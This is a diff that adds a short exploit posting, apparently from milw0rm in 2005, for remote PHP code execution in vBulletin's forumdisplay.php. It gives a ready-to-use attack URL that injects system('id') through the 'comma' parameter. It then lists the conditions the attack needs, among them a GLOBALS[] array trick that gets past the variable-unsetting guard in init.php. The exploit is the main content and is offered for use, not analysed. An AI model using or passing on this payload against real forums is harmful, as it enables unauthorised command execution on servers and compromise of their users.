@@ -1,0 +1,20 @@
+Exploit:
+----------------
+http://site/forumdisplay.php?GLOBALS[]=1&f=2&comma=".system('id')."
+
+Conditions:
+----------------
+1st condition     : $vboptions['showforumusers'] == True , the admin must set
+		    showforumusers ON in vbulletin options.
+
+2nd condition     : $bbuserinfo['userid'] == 0 , you must be an visitor/guest.
+
+3rd condition     : $DB_site->fetch_array($forumusers) == True , when you
+		    visit the forums, it  must has at least one user show the forum.
+
+4th condition     : magic_quotes_gpc must be OFF
+
+SPECIAL condition : you must bypass unset($GLOBALS["$_arrykey"]) code in
+		    init.php by secret array GLOBALS[]=1 ;)))
+
+# milw0rm.com [2005-02-14]
